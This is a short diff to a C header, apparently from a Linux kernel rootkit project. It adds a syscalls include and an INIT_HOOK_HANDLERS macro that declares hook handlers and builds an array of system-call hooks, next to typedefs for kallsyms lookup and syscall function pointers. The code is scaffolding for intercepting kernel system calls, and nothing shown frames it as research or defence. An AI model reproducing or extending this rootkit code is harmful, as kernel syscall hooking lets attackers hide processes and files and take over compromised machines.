@@ -2,6 +2,7 @@
 #define _ROOTKIT_HOOKING_H_
 
 #include <asm/ptrace.h>
+#include <linux/syscalls.h>
 #include <linux/types.h>
 
 
@@ -23,6 +24,10 @@
     {                                          \
         __MAPX_LIST(SYSCALL_HOOK, __VA_ARGS__) \
     }
+
+#define INIT_HOOK_HANDLERS(_sc_hooks_var, ...) \
+    DECLARE_HOOK_HANDLERS(__VA_ARGS__)         \
+    hook_t _sc_hooks_var[] = SYSCALL_HOOKS(__VA_ARGS__);
 
 typedef void *(*kallsyms_t)(const char *s_name);
 typedef long (*sysfun_t)(struct pt_regs *p_regs);
